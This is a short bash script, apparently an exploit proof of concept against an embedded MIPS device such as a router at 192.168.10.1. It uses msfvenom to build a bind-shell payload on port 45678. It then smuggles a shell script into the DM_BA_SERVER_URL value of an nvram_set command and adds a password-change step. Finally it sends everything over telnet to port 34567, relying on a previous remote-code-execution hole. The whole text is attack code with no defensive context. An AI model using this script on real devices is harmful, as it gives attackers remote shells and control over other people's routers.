#!/bin/bash

if [ ! -f bind_shell ]; then
msfvenom -p linux/mipsle/shell_bind_tcp RHOST=0.0.0.0 LPORT=45678 -f elf > bind_shell
fi

python3 generate_strings.py > commands
echo -n "nvram_set 2860 DM_BA_SERVER_URL '" >> commands
cat script.sh >> commands
echo "'" >> commands
cat password_change >> commands
echo "exit" >> commands


#this assumes there is already a bind shell set up from the password-change RCE PoC
sh -c "cat commands; sleep 10" | telnet 192.168.10.1 34567 > log.txt